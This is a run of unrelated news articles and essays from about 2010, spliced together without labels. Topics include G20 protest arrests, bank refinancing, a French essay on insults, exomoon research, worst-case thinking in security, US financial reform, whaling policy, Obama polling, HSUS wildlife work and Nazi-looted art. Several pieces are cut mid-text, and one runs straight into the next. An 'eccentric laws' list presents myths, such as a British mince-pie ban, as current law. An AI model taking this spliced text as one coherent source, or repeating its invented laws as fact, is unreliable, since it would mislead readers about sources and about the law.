So what was this all about and why were John and Sue Pruyn arrested if they were part of the gathering of peaceful demonstrators in the Queen ’s Park area ?
Was their crime to dare to come to Toronto in the first place and join with those who express concerns about the G20 and whether it has any concern at all for the environment , for people living in poverty , for fair access to health care and other issues important to people around the world who fall into the category of ‘ have nots ’ ?
Pruyn wonders if the idea of the crackdown was to send a message to the public at large that gatherings of opposition to government policies wo n’t be tolerated .
“ That is ( Prime Minister Stephen ) Harper ’s attitude , ” he said .
“ He does n’t like dissent in his own ( party ) ranks . ”
Kormos said some might respond to the crackdown against the G20 summit demonstrators by saying that they should have stayed home or they should not have been there , or that if they were swept up by the police , they should have nothing to worry about if they did nothing wrong .
But that misses the point , he said .
It misses the possibility that this was another example of the province and country sliding down a path of clamping down on citizens ’ right to gather together and express views that may not be popular with the government of the day .
Kormos stressed again that a public inquiry is needed , not only for those demonstrators arrested and roughed up during the summit , but for those shop owners in Toronto that had their stores vandalized by a horde of hooligans with little apparent presence of police officers to prevent it .
Asked if there was any possibility a few hundred black - clad vandals were allowed to run wild to make the thousands of people there to demonstrate peacefully look badly , Kormos responded ; “ That ’s why we need a public inquiry . ”
Susan Pruyn agreed .
“ We need a public inquiry for all of the people who went ( to Toronto ) with good intentions and who ended up suffering that weekend , ” she said .

FRANKFURT —
The sovereign debt crisis would seem to create worry enough for European banks , but there is another gathering threat that has not garnered as much notice : the trillions of dollars in short - term borrowing that institutions around the world must repay or roll over in the next two years .
The European Central Bank , the Bank of England and the International Monetary Fund have all recently warned of a looming crunch , especially in Europe , where banks have enough trouble raising money as it is .
Their concern is that banks hungry for refinancing will compete with governments — which also must roll over huge sums — for the bond market ’s favor .
As a result , credit for business and consumers could become more costly and scarce , with unpleasant consequences for economic growth .
“ There is a cliff we are racing toward — it ’s huge , ” said Richard Barwell , an economist at Royal Bank of Scotland and formerly a senior economist at the Bank of England , Britain ’s central bank .
“ No one seems to be talking about it that much . ”
But , he added , “ it ’s of first - order importance for lending and output . ”
En quelques mots , la fameuse apostrophe de Nicolas Anelka à Raymond Domenech en Afrique du Sud , le 17 juin : " Va te faire enculer , sale fils de pute ! " , condense une certaine dérive française .
Cette insulte , aussi répandue à l'école que dans la rue , signifie en premier lieu l'inquiétude généalogique , l'angoisse , fréquente pour les déracinés , de ne pas savoir d'où ils viennent , qui est leur père et donc leur patrie .
Un " fils de pute " , fruit d'amours anonymes , n'est l'enfant de personne , un bâtard procréé par une chienne , pour filer la métaphore .
La France elle - même , dans de nombreuses chansons de rap , est représentée comme une " putain " coupable de s'être mélangée à tous les peuples de la planète et d'être aujourd ' hui perdue dans un monde qui la dépasse .
Si ta mère n'est qu'une traînée , tu es toi- même le fruit du hasard , un être inutile et vain qui n'est pas sûr de ses ancêtres .
Tant que les hommes se traiteront de " fils de pute " ( curieusement il n'y a pas de " filles de pute " , comme si pour elles l'ascendance ne comptait pas ) , les femmes auront quelque souci à se faire sur la bienveillance de leurs compagnons .
Quant à l'épithète " enculé " , elle stigmatise la passivité de l'homme bestialisé , réduit à l'état de femelle offerte ( dans la Rome antique , le maître avait le droit de sodomiser ses esclaves .
L'inverse était considéré comme un renversement dramatique des hiérarchies ) .
Ce qui est préoccupant dans ce genre d'énoncés , c'est leur banalisation .
Le propre d'une injure , exutoire de la colère , hygiène indispensable du langage , c'est son pouvoir d'effraction , sa rareté .
Devenue machinale , elle s'émousse .
Mais elle trahit un niveau de rage sociale , d'appauvrissement du vocabulaire , de mépris de l'autre et de soi-même qui est préoccupant ( sur un autre plan , voyez l'usage du mot " fuck " dans les films nord - américains , devenu aussi commun que " passe - moi le sel " ) .
Si la routinisation de l'injure n'était que l'apanage des voyous , elle resterait bornée à un petit groupe , comme jadis l'argot des charretiers ou des poissardes .
UN SYMPTÔME D'ÉCHEC COLLECTIF
Mais elle contamine toutes les strates de la société , dans le sport , bien sûr , dans la jeunesse dorée comme la jeunesse déshéritée , et jusqu'aux plus hauts sommets de l'Etat : on se souvient du malheureux " Casse - toi , pauvre con ! " de notre président .
Quand les élites se mettent à parler comme la racaille , la nation devient une seule plèbe , du haut en bas , unie par un même état d'esprit , une même vulgarité qui contamine les rapports humains .
Défaite de la civilité , de la politesse censées brider l'agressivité et contraindre hommes et femmes à emprunter d'autres voies .
Cette violence verbale , à tous les niveaux , conjure surtout l'absence d'avenir et la banqueroute où s'enfonce notre société .
Nous nous conduisons comme une bande de malfrats qui ont raté leur coup et commencent à s'entredévorer , à se déchirer pour compenser leur faillite .
La grossièreté n'est pas qu'un manque d'éducation ou de contrôle sur soi : elle est aussi un symptôme d'échec collectif .

TrES - 2b : Pushing Exomoon Limits
The planet known as TrES - 2b is an interesting and useful place .
Just over Jupiter mass , it orbits a solar mass star some 717 light years from Earth , a ‘ hot Jupiter ’ in a tight 2.47 - day orbit .
It ’s also a transiting planet , discovered by the Trans - Atlantic Exoplanet Survey , which uses small , automated equipment and off - the - shelf technology to get the job done , feeding planet candidates to larger installations like the Keck Observatory and Palomar Observatory .
But TrES - 2b has a new and important distinction :
It ’s in the field of view of the space - based Kepler telescope .
Now we ’re really in business .
Exomoon - hunter David Kipping ( University of London ) said in a recent email that when this planet is viewed in ‘ short - cadence mode ’ with Kepler , it ’s like seeing transits in High Definition .
And indeed , that seems to be the case , as you can see in the diagram below .
Kepler offers two measurement cadences : 1 minute cadence for up to 512 targets and a 30 minute cadence for up to 170,000 stars .
In the early phases of the mission , short - cadence observations are reserved largely for astroseismology targets , but as planet candidates turn up through long - cadence observations , they can be put on short - cadence for better transit coverage .
Have a look at the image to see the difference between the short - and long - cadence lightcurves for TrES - 2b .
Click to enlarge the image :
Image : Short - cadence folded transit lightcurve of TrES - 2b ( circles ) with model fit overlaid .
We also show the long - cadence folded transit lightcurve ( triangles ) with an overlaid model .
The long - cadence curve is a smeared out version of the short - cadence data due to the long integration times .
Image and caption : David Kipping .
Working with Gáspár Bakos ( Harvard - Smithsonian Center for Astrophysics ) , Kipping has produced a paper analyzing 18 short - cadence lightcurves of TrES - 2b from Kepler , with that ‘ HD ’ quality he talks about producing ‘ the most accurate determination of the transit parameters yet obtained for this system . ’
Indeed , the photometry is exquisite , and the precision of the data may be the most outstanding result of our TrES - 2b investigations to this point .
I want to quote from Kipping ’s email on this :
Although TrES - 2b is found to be a fairly static system , the real result is the quality of the data which exhibits unprecedented quality – 230 parts per million ( ppm ) per minute – which is enough to detect a 6.5 hour transit ( typical for a habitable - zone planet ) with a noise level of 11.6 ppm ( so for signal - to - noise = 3 you could detect a 34.8 ppm transit ) .
This is actually above the design specification which was expected to reach 15.2 ppm over the same time - scale for a star of this brightness .
It translates to Kepler being able to detect planets about 13 % smaller than the design specification .
TrES - 2b now becomes the planet most closely studied for the possible presence of a satellite .
The new work excludes moons between 0.25 to 3 Earth masses depending on the orbital configuration , a finding displayed in the chart below .
Make no mistake about where this points —
Kepler is now proven to produce data of sufficient detail to detect exomoons below Earth mass .
And while TrES - 2b has n’t yielded one , this exciting paper tells us that we should be able to study habitable - zone Jupiters for exomoons that could potentially hold life .
Image : Excluded exomoon masses for TrES - 2b , as a function of the orbital distance of the moon around TrES - 2 b and the orbital inclination with respect to the observer ’s line - of - sight .
Contours are given in units of Earth masses .
The Kepler data is able to easily probe down to sub -Earth mass exomoons .

Worst - Case Thinking
At a security conference recently , the moderator asked the panel of distinguished cybersecurity leaders what their nightmare scenario was .
The answers were the predictable array of large - scale attacks : against our communications infrastructure , against the power grid , against the financial system , in combination with a physical attack .
I did n’t get to give my answer until the afternoon , which was : “ My nightmare scenario is that people keep talking about their nightmare scenarios . ”
There ’s a certain blindness that comes from worst - case thinking .
An extension of the precautionary principle , it involves imagining the worst possible outcome and then acting as if it were a certainty .
It substitutes imagination for thinking , speculation for risk analysis , and fear for reason .
It fosters powerlessness and vulnerability and magnifies social paralysis .
And it makes us more vulnerable to the effects of terrorism .
Worst - case thinking means generally bad decision making for several reasons .
First , it ’s only half of the cost - benefit equation .
Every decision has costs and benefits , risks and rewards .
By speculating about what can possibly go wrong , and then acting as if that is likely to happen , worst - case thinking focuses only on the extreme but improbable risks and does a poor job at assessing outcomes .
Second , it ’s based on flawed logic .
It begs the question by assuming that a proponent of an action must prove that the nightmare scenario is impossible .
Third , it can be used to support any position or its opposite .
If we build a nuclear power plant , it could melt down .
If we do n’t build it , we will run short of power and society will collapse into anarchy .
If we allow flights near Iceland ’s volcanic ash , planes will crash and people will die .
If we do n’t , organs wo n’t arrive in time for transplant operations and people will die .
If we do n’t invade Iraq , Saddam Hussein might use the nuclear weapons he might have .
If we do , we might destabilize the Middle East , leading to widespread violence and death .
Of course , not all fears are equal .
Those that we tend to exaggerate are more easily justified by worst - case thinking .
So terrorism fears trump privacy fears , and almost everything else ; technology is hard to understand and therefore scary ; nuclear weapons are worse than conventional weapons ; our children need to be protected at all costs ; and annihilating the planet is bad .
Basically , any fear that would make a good movie plot is amenable to worst - case thinking .
Fourth and finally , worst - case thinking validates ignorance .
Instead of focusing on what we know , it focuses on what we do n’t know — and what we can imagine .
Remember Defense Secretary Rumsfeld ’s quote ?
“ Reports that say that something has n’t happened are always interesting to me , because as we know , there are known knowns ; there are things we know we know .
We also know there are known unknowns ; that is to say we know there are some things we do not know .
But there are also unknown unknowns — the ones we do n’t know we do n’t know . ”
And this : “ the absence of evidence is not evidence of absence . ”
Ignorance is n’t a cause for doubt ; when you can fill that ignorance with imagination , it can be a call to action .
Even worse , it can lead to hasty and dangerous acts .
You ca n’t wait for a smoking gun , so you act as if the gun is about to go off .
Rather than making us safer , worst - case thinking has the potential to cause dangerous escalation .
The new undercurrent in this is that our society no longer has the ability to calculate probabilities .
Risk assessment is devalued .
Probabilistic thinking is repudiated in favor of “ possibilistic thinking “ :
Since we ca n’t know what ’s likely to go wrong , let ’s speculate about what can possibly go wrong .
Worst - case thinking leads to bad decisions , bad systems design , and bad security .
And we all have direct experience with its effects : airline security and the TSA , which we make fun of when we ’re not appalled that they ’re harassing 93 - year - old women or keeping first graders off airplanes .
You ca n’t be too careful !
Actually , you can .
You can refuse to fly because of the possibility of plane crashes .
You can lock your children in the house because of the possibility of child predators .
You can eschew all contact with people because of the possibility of hurt .
Steven
Hawking wants to avoid trying to communicate with aliens because they might be hostile ; does he want to turn off all the planet ’s television broadcasts because they ’re radiating into space ?
It is n’t hard to parody worst - case thinking , and at its extreme it ’s a psychological condition .
Frank Furedi , a sociology professor at the University of Kent , writes : “ Worst - case thinking encourages society to adopt fear as one of the dominant principles around which the public , the government and institutions should organize their life .
It institutionalizes insecurity and fosters a mood of confusion and powerlessness .
Through popularizing the belief that worst cases are normal , it incites people to feel defenseless and vulnerable to a wide range of future threats . ”
Even worse , it plays directly into the hands of terrorists , creating a population that is easily terrorized — even by failed terrorist attacks like the Christmas Day underwear bomber and the Times Square SUV bomber .
When someone is proposing a change , the onus should be on them to justify it over the status quo .
But worst - case thinking is a way of looking at the world that exaggerates the rare and unusual and gives the rare much more credence than it deserves .
It is n’t really a principle ; it ’s a cheap trick to justify what you already believe .
It lets lazy or biased people make what seem to be cogent arguments without understanding the whole issue .
And when people do n’t need to refute counterarguments , there ’s no point in listening to them .

The financial reform legislation might change how Wall Street does business , but it would hardly put Wall Street out of business .
The measure that emerged from a House - Senate conference committee would push banks to make their trading in complex securities known as derivatives more transparent and to cut back on some of the risky trading that triggered the financial crisis .
It would also give regulators new powers to oversee lightly regulated financial firms , including hedge funds and insurers .
But though the legislation would put new limits on Wall Street banks , it would n’t outright bar many of their activities — including rapid - fire stock and bond trading and the packaging of complex securities to hedge their investment bets .
“ After the dust settles , and they ’ve crossed all the Ts , there ’s probably not going to be much difference in how the banking industry looks — that ’s the long and short of it , ” said Raymond Stewart , chief investment officer of Rasara Strategies , which specializes in investing in the financial sector .
Moreover , the legislation leaves largely untouched some of the biggest concerns about the financial industry that grew out of the mortgage meltdown and the resulting credit crisis .
These include worries that banks have grown so powerful that they are “ too big to fail , ” and that Wall Street ’s pay system — built on the annual bonus — has made short - term trading profits the primary focus .
Sheila Bair , head of the Federal Deposit Insurance Corp. , said that many of the measures that most scared the banks — including provisions to restrict trading of derivatives — ended up being scaled back in the legislative scrum .
“ I think they are breathing a sigh of relief today because the derivatives piece ended up being much less onerous than they originally expected , ” Bair said .
“ It could have been a lot worse . ”
Reflecting that sentiment , financial stock indexes jumped almost 3 % after sinking about 15 % in the last two months .
The country ’s giant banks do expect to feel bottom - line financial pain from the legislation , including from restrictions on so - called proprietary trading , in which a bank trades stocks , bonds and other securities for its own profit , not on behalf of a client .
Restrictions on proprietary trading and derivatives trading would affect Goldman Sachs Group Inc. the most of any Wall Street bank , according to one estimate , cutting its earning power by up to 23 % .
“ In the short run you ’re going to have some pressure on your revenues — and some pressure on costs , ” said Matthew Warren , a financial industry analyst at research firm Morningstar .
“ In the long run , though , it ’s just not going to be that different . ”
The legislation will go to the full House and Senate for floor votes next week , and President Obama has said he hopes to sign the bill by July 4 .
In one major change , the legislation provides for a council of regulators that would have the ability to wind down financial institutions that end up in trouble and that are deemed “ systemically significant ” — such as insurance companies .
But the overhaul legislation would n’t force big banks — the target of much public criticism during the crisis — to shrink .
In contrast , in the 1930s , the landmark Glass - Steagall Act forced banks to separate their riskier investment banking operations from their commercial banks , which predominantly take deposits and make loans .
The idea was to protect commercial banks , which are backed by federal deposit insurance , from devastation during financial crises .
The Glass - Steagall provision , however , was repealed in 1999 .
Moving back in the direction of Glass - Steagall , the Obama administration proposed the so - called Volcker rule , developed by former Federal Reserve chief Paul Volcker .
The rule was one of the most contentious elements of this week ’s negotiations .
The final compromise limits banks to investing no more than 3 % of their capital in hedge funds , private equity funds and proprietary trading desks .
On derivatives , the banks would be forced to move some particularly risky trading into separate entities .
Virtually all derivatives would have to be traded through a clearinghouse , bringing down some of the profits from the private derivatives deals in which the banks currently engage .
Among the measures that reformers wanted to see — but that were not included in the bill — was an independent oversight board to address conflicts of interest in the debt - rating industry .
Firms such as Standard & Poor ’s and Moody ’s have been blamed for bestowing bullish grades on mortgage - linked securities that subsequently plummeted in value during the housing bust .
The Senate bill would have created an oversight board , but congressional negotiators last week agreed to drop that provision , opting instead for a study by the Securities and Exchange Commission along with a slightly easier path for investors to sue the rating firms .
The legislation also does n’t deal with Fannie Mae and Freddie Mac , the government - sponsored mortgage finance giants that have been blamed for contributing to the mortgage meltdown .
“ The big hole here is that nothing is being done about Fannie and Freddie , ” said Robert Pozen , chairman of MFS Investment Management and a senior fellow at the Brookings Institution .
“ And that is a huge hole . ”

The more laws and order are made prominent , the more thieves and robbers there will be .
Here is a collection of some of the eccentric laws in the world .
We can laugh , we can gasp , we can only wonder …
1 . Think before you chew
In Singapore , chewing gum is prohibited .
This rule was introduced because of the high cost and difficulty in removing stuck chewing gum from public premises .
In particular , chewing gum stuck on the Mass Rapid Transit train doors stopped the trains from moving .
It happened a few times and those were a few times too many .
2. Lighten up
Drivers in Denmark are supposed to drive vehicles with their headlights on .
You ’d think this law would apply to night driving but it does n’t .
It is considered essential during the day as well or they may face a fine of up to $ 100 .
Studies have shown that this has helped a lot to avoid road accidents in Denmark .
3 . To fail > to jail
In Bangladesh , children 15 and older can be put in jail for cheating on their final examinations .
Every year , Bangladeshi government takes strong measures to stop cheating and carries out a massive media campaign to forewarn students through print and television .
4 . Picky about chicks
According to Akron - Ohio Act 925.62 , No person , firm , or corporation shall dye or otherwise color any rabbit or baby poultry , including , but not limited to , chicks and ducklings .
No person , firm , or corporation shall sell , offer for sale , expose for sale , raffle , or give away any rabbit or baby poultry which has been dyed or otherwise colored .
5 . Keep the change
In Canada , Currency Act of 1985 prohibits consumers from using unreasonable amounts of coins to pay for purchases .
This means you ca n’t pay for an item in all coins ( especially if it ’s over $ 10 ) .
Even the use of dollar - coins is limited .
The shop owner has the right to choose whether or not he wants to take your coins but does n’t have to .
6 . Sue them pants !
In France it is still against the law for women to wear pants .
The law reportedly has been on the books since 1800 .
It was amended several times : once in 1892 to allow women to sport trousers while riding horses and again in 1909 to permit the ladies to wear pants while on bicycles .
7 . Being twins , a sin ?
China ’s one child policy was established by Chinese leader Deng Xiaoping in 1979 to limit communist China ’s population growth .
35.9 % of China ’s population is currently subject to the one - child restriction .
The government believes it has helped to alleviate social , economic and environmental problems in China .
8 . The law with a flaw
In Georgia no bicycle shall be equipped , modified , or altered in such a way as to cause the pedal in its lowermost position to be more than 12 inches above the ground , nor shall any bicycle be operated if so equipped .
The question is : Who would ride such a bike ?
9. One Two Three GO !
In Massachusetts at a wake , mourners may eat no more than three sandwiches .
It is one of those laws that was written in books and never removed since then .
Bad manners , one might consider it , but in Massachusetts it is a criminal offense .
10.ImPie-ous Christmas
In Britain , it is illegal to consume a mince pie on Christmas Day .
It is one of the odd old laws on the statute book , although rarely enforced by even the keenest police officer .
It was brought to existence by Oliver Cromwell , self proclaimed Lord Protector of England .
Festivals that promoted gluttony and drunkenness were against the righteous Christian ethics , including Christmas .

June 05 , 2010
By Stephen Clark
Environmentalists , already peeved with the administration ’s handling of the Gulf oil spill , are accusing President Obama of breaking his campaign pledge to end the slaughter of whales .
The Obama administration is leading an effort within the International Whaling Commission to lift a 24 - year international ban on commercial whaling for Japan , Norway and Iceland , the remaining three countries in the 88 - member commission that still hunt whales .
The administration argues that the new deal will save thousands of whales over the next decade by stopping the three countries from illegally exploiting loopholes in the moratorium .
But environmentalists are n’t buying it .
“ That moratorium on commercial whaling was the greatest conservation victory of the 20th century .
And in 2010 to be waving the white flag or bowing to the stubbornness of the last three countries engaged in the practice is a mind - numbingly dumb idea , ” Patrick Ramage , the whaling director at the International Fund for Animal Welfare , told FoxNews.com .
Several environmental groups have joined forces to pressure Obama to withdraw his support for the deal before the whaling commission votes June 20 in Morocco on whether to lift the ban that was championed by President Reagan .
The groups have run ads in major newspapers highlighting Obama ’s campaign promise in 2008 to “ strengthen the moratorium on commercial whaling , ” adding that “ allowing Japan to continue commercial whaling is unacceptable . ”
“ We ask you to honor your promise , stop the sellout , and save the whales , ” the ad reads .
The White House did not respond to an e-mail seeking comment .
Under Obama ’s deal , the three whaling countries would be allowed to keep hunting whales for a 10 - year period in reduced numbers .
The whaling countries in return would agree to tighter oversight of their operations , including participation in a whale DNA registry .
“ We recognize that these measures do not meet the needs of those who want a complete end to whaling now , but neither can it be characterized as a whalers ’ charter , ” the whaling commission said in a press release announcing the proposal .
“ We believe that it is undeniably better than the status quo . ”
Meanwhile a colleague of Peter Bethune , the Animal Planet star awaiting trial in Tokyo after a collision between his anti-whaling boat and a Japanese ship , says the environmental activist is doing what the international community refuses to do — save the whales .
The 1986 moratorium unquestionably reduced the number of whales killed each year .
But it ’s not as clear by how much .
Some estimate that an average of 38,000 whales were killed each year before the moratorium reduced it to an average of 1,240 .
Ramage said as many as 60,000 whales were killed before the moratorium — a figure that he says has been cut to about 1,700 per year .
“ To say that the moratorium does n’t work , that is a conscious effort to mislead or a complete misreading of the facts , ” Ramage said , adding that “ throwing it overboard in the name of good feeling and cooperation and conciliation with Japan is jaw dropping . ”

Land grabs under the auspice of Wildlife Conservation to “ protect species ” ; yet the Obama Administration is working to LIFT THE BAN ON WHALE HUNTING .
They even shut the water off in the California valley to protect a “ SMELT ” ……

Obama 's erosion among white voters continues
President Obama continues to struggle among white voters .
AP Photo
The latest Washington Post / ABC News poll shows President Obama 's standing among white voters continuing to slip , a potentially ominous sign for his party with the midterm elections fast approaching .
Just 40 percent of whites in the Post / ABC survey approve of the job Obama is doing , his lowest rating among this key demographic since the start of his presidency and well below the 50 percent approval number that he carries nationwide .
Forty - three percent of white voters strongly disapprove of the job Obama is doing , while just 19 percent strongly approve .
Among the other lowlights with whites in this poll for Obama : 54 percent of college - educated whites now disapprove of the job he is doing , and , among white college - educated women , Obama 's approval numbers has dipped below 50 percent for the first time in his presidency in Post / ABC polling .
Much of Obama 's struggles with white voters seems directly attributable to the public 's deep pessimism about the economy .
( Ninety - four percent of whites polled rated the economy either not so good or poor . )
Just over one in three whites ( 37 percent ) approve of Obama 's handling of the economy -- his worst rating among that demographic group ever .
Forty - eight percent of white voters strongly disapprove of Obama 's stewardship of the economy , while 13 percent strongly approve .
It 's interesting that Obama 's flagging numbers on the economy have been driven not by white Republicans or white Independents but rather by white Democrats .
Since April , white Democratic approval of Obama 's handling of the economy is down 20 points , from 80 percent to 60 percent .
And , nearly as many white Democrats now strongly disapprove of how he 's dealing with the issue as those who strongly approve ( 25 strongly disapprove ; 28 strongly approve ) .
( Huge thank you to Post polling director Jon Cohen for crunching the numbers ! )
Why does this crush of data matter -- particularly for the 2010 election ?
As we wrote in an earlier column , recent historical trends suggest that white voters will comprise a larger chunk of the coming midterm electorate than they did in 2008 -- making the erosion of Obama 's numbers a major concern for House strategists .
White voters made up 79 percent of the 2006 midterm electorate and comprised 74 percent of the 2008 vote .
If the 2010 electoral composition mirrors that of 2006 , one Democratic official who closely monitors House race predicted " massive losses " for House and Senate Democrats in November .
The Atlantic 's Ron Brownstein has written extensively -- and smartly -- about Obama 's struggles with white voters both during and after the 2008 election .
( Worth noting : Obama outperformed the party 's last two presidential nominees among all white voters in 2008 . )
Way back in January Brownstein wrote these prophetic lines :
" The depth -- and breadth -- of the decline in [ Obama 's ] support among whites ought to be giving Democrats heartburn .
That 's especially so because a falloff in minority participation during the midterm election makes it likely whites will likely cast a slightly larger share of the vote in November than the 74 percent they did in 2008 .
In each of the three major elections since 2008 -- the GOP 's wins in the 2009 New Jersey and Virginia gubernatorial races and Republican Scott Brown 's stunning upset victory Tuesday in the Massachusetts Senate contest -- the GOP candidate ran notably better among whites in their state than John McCain did against Obama in 2008 . "
The Post / ABC poll provides some grim backup -- if you are a Democrat -- for Brownstein 's point .
In the overall generic ballot question -- " If the election for U.S. House were being held today would you vote for the Democratic candidate or the Republican candidate " -- the Republican candidate took 47 percent to the Democrat 's 46 percent .
But , among white registered voters , Republicans held a 20 - point -- 56 percent to 36 percent -- generic ballot edge and among white likely voters the margin for Republicans was 23 points .
What these numbers mean is that congressional Democrats need one of two things to happen to avoid major losses this fall : 1 ) Obama 's numbers must rebound among white voters in some significant way or 2 ) The Democratic National Committee 's plan to re-create elements of the 2008 electoral coalition must work , changing the face of the traditional midterm electoral in a meaningful manner .
Neither scenario , at the moment , is all that likely -- which may well have something to do with the increasingly public airing of discontent aimed at the White House from House leaders .
The HSUS is a broad - minded animal protection organization , and it is our mission to protect all animals .
That includes wildlife , whether the wild animals are victims of oil spills , climate change , automobiles , development , leghold trappers or poachers .
One of our most important wildlife protection efforts is to combat poaching , which may claim more animals ' lives in the United States than lawful sport hunting .
Here 's an issue on which both animal advocates and hunters can agree .
As Pennsylvania hunting writer Tom Venesky wrote in a recent column , " Poaching is the lowest of the low when it comes to crimes against wildlife .
Considering that the Humane Society touts itself as an animal protection organization and hunting is a sport steeped in ethics , neither group wants to see a trophy bear or any other animal wasted by a poacher 's gun . "
" The Humane Society is doing its part , " Venesky added .
" This year , the organization has posted rewards for 25 poaching cases across the country for a total of $ 62,500 .
Those cases include bears , eagles , deer , turtles , elk , javelina , porcupines , hawks and mountain lions .
Five of those cases happened right here in Pennsylvania .
Conversely , I have yet to see a statewide or national hunting organization put up a reward for a poaching case , something that 's quite puzzling . "
Indeed , we welcome the opportunity to work with hunters on this issue .
But there is a small - mindedness among too many within the hunting fraternity , and there 's no better example than the controversy playing out right now in Wisconsin .
In that state , the HSUS and the Wisconsin Department of Natural Resources are collaborating on a public awareness campaign urging citizens to leave juvenile wildlife in the wild , unless they are in obvious distress and would benefit from removal and treatment at a wildlife care center .
Hunting groups rarely if ever address this issue , and the Wisconsin DNR has been strapped for cash .
So The HSUS stepped in to help , and the advertising campaign we 've helped to fund does n't even invoke our good name .
A few advocates of the hunting lobby and their allies in the state Legislature and in the outdoor press have called , in the most knee - jerk way , for the DNR to terminate the joint awareness program , even though they claim to agree with the message of the campaign .
" A partnership like this , even on a non-controversial issue , has the risk to be seen as an endorsement of the HSUS in general , " said George Meyer , executive director of the Wisconsin Wildlife Federation and former head of the DNR .
GOP state Sen. Neal Kedzie of Elkhorn said that The HSUS had " penetrated " and " infiltrated " the DNR .
Meyer and Kedzie protest too much .
The HSUS opposes cruel traps , and we work only to combat the most inhumane forms of hunting , such as bear baiting or canned hunts .
But this measure has nothing to do with hunting - it is about leaving wildlife in the wild and not picking up baby animals during the birthing season just because you do n't see their mother around .
Most hunting groups do quite little to combat poaching , or protecting newborn wildlife .
My advice is these outfits just stay out of the way when other groups , including the HSUS , choose to step in to address those issues and to protect wildlife .
The good people of Wisconsin , like the rest of us , remember only too well the era of McCarthyism and the red- baiting that occurred back then .
Kedzie sounds like a chip off the old block .
This is baiting of another sort , and it's not becoming to any of the critics of an important and beneficial public awareness campaign .

This commentary first appeared in his blog .
Before the outbreak of World War I , Adolf Hitler was a practicing artist .
On two separate occasions , Hitler was denied admission to the Academy for Art Studies in Vienna .
He took art very seriously and during his 12 - year reign as German Führer , the international art industry was demolished .
It has been estimated that Hitler stole over 750,000 artworks during the war .
The years between 1933 and 1945 are a black hole in the art community , with thousands of pieces of art changing hands and going missing .
During World War II , the Nazis went on a rampage destroying and stealing European art .
Priceless pieces of art were auctioned off at extremely low prices .
This has created a major problem in the art community that remains evident today .
People purchased stolen art and the victim ’s families want their possessions back .
In many cases , proving the legal rights to a piece of art is a difficult and time consuming process .
This article will be examining 10 famous pieces of art that were stolen by the Nazis .
Editors Note :
This article was written in July 2010 , but we have republished it with the release of Monument Men and the interest that movie has drawn to the theft of art by the Nazis .
10 . Saint Justa and Saint Rufina
Artist : Bartolome Esteban Murillo
Bartolomé Esteban Murillo is one of the most important Spanish painters in history .
He was alive during the 17th century and is a cherished painter of the Baroque period of art .
Murillo is probably best known for his religious works , but also painted many portraits of everyday life .
In 1943 , the Allied armies formed a coalition of men whose goal was to assist in the protection of valuable art and national monuments .
The group became known as the Monuments Men .
The Monuments Men were vital in the process of gathering stolen art and returning it to the rightful owner .
As the Allied Forces liberated Nazi- occupied territories , Monuments Men were present at the front lines .
In Germany alone , U.S forces found approximately 1,500 repositories of art and cultural objects , with hundreds - of - thousands of artifacts .
Some of the most identifiable pieces of art were immediately returned to their rightful owners .
However , thousands of artifacts were never claimed or stolen .
Today
Monument Men organizations still exist today , with the goal of tracking down and returning stolen art .
Recently , a member of the organization stumbled upon an old picture taken during World War II .
It showed a photo of Murillos famous pair of paintings titled Saint Justa and Saint Rufina .
Immediately the connection was made with the Meadows Museum
in Dallas , which houses the paintings .
The Meadows Museum holds one of the largest collections of Spanish art outside of Spain , with masterpieces by some of the world ’s greatest painters .
After some intense research , it was confirmed that the museum had the two painting and they were in fact stolen by the Nazis during World War II .
This was accomplished by examining the back of the picture frames , which contained a number R1171 .
This number is consistent with art stolen by Germany and stands for Rothschild , 1171 , which is the 1,171st object stolen from the Rothschilds .
The Rothschild family was looted in France , 1941 .
Like all stolen art , a major legal battle has pursued , as the Meadows Museum legally purchased the portraits at an auction , but the paintings whereabouts before the auction are confusing .
The two portraits are estimated to be worth more than $ 10 million .
9. Painter on the Road to Tarascon
Artist : Vincent van Gogh
Vincent van Gogh was a Dutch painter that died in 1890 at the age of 37 .
He is one of the most renowned and well known painters in the history of art .
On January 31 , 1933 Adolf Hitler became chancellor of Germany .
One of his first actions was the “ cleansing of the German culture , ” which included book burnings and the labeling of degenerate art .
Degenerate art included all types of modern artistic expression .
Any artist , past or present , that was not seen as having Aryan blood was deemed degenerate .
Hitler made it a high priority to track down all degenerate art and steal it .
If you were labeled a degenerate artist then you were not allowed to paint .
Nazi soldiers would even make routine house calls to ensure that some artists were not painting .
The abuse was inflicted on many modern German painters , including Ernst Ludwig Kirchner , who was labeled degenerate and had all of his over 600 works sold or destroyed .
Kirchner would commit suicide in 1938 .
The Nazis destroyed hundreds of famous paintings and the ones that survived were featured in a “ Degenerate Art Show . ”
It was claimed that this show was meant to incite further revulsion against the “ perverse Jewish spirit . ”
The famous pieces of art were crowded into small rooms and often displayed with a hanging cord .
According to the history books , the first room contained art considered demeaning of religion , the second featured works by Jewish artists in particular , and the third contained works deemed insulting to the people of Germany .
Some of the artists featured in the show were Alexander Archipenko , Marc Chagall , James Ensor , Henri Matisse , Pablo Picasso , and Vincent van Gogh .
After the exhibit ended , the famous pieces of art were either destroyed or sold at auctions .
A large amount of “ degenerate art ” by Picasso , Dalí , Ernst , Klee , Léger and Miró was destroyed in a bonfire on the night of July 27 , 1942 in Paris .
In 1939 , a stolen self - portrait by Vincent van Gogh was auctioned at Gallerie Fisher , Lucerne , for $ US 40.000 .
One of the most famous paintings to be burned during World War II is the Painter on the Road to Tarascon by Vincent van Gogh .
It is not known for sure how the painting was burned , but it is thought to have perished when the Allied forces bombed Magdeburg , setting fire to the Kaiser - Friedrich Museum , which contained stolen art .
Today
The Painter on the Road to Tarascon was lost forever when it became a causality of the Second World War , but the portrait has left a lasting impression .
It remains one of the most cherished pieces of art that was lost in the war .
The painting shows a lonely portrait of Vincent van Gogh traveling .
The painting was a heavy influence on artist Francis Bacon , who described it as a haunting image of van Gogh , showing him as an alienated outsider .
Vincent van Gogh was quoted as saying “ Real painters do not paint things as they are …
They paint them as they themselves feel them to be . ”
8. Portrait of Dr. Gachet
Artist : Vincent van Gogh
In 1933 , the famous Dutch painter Vincent van Gogh was put on Hitler ’s list of “ degenerate artists . ”
Many of van Gogh ’s most famous pieces of art were stolen from their owners and displayed in mock museums .
One of these paintings was the famous Portrait of Dr. Gachet .
The month before Vincent van Gogh committed suicide , he painted two different copies of the Portrait of Dr. Gachet .
He wrote a letter to his brother regarding the painting , “ I ’ve done the portrait of M. Gachet with a melancholy expression , which might well seem like a grimace to those who see it …
Sad but gentle , yet clear and intelligent , that is how many portraits ought to be done …
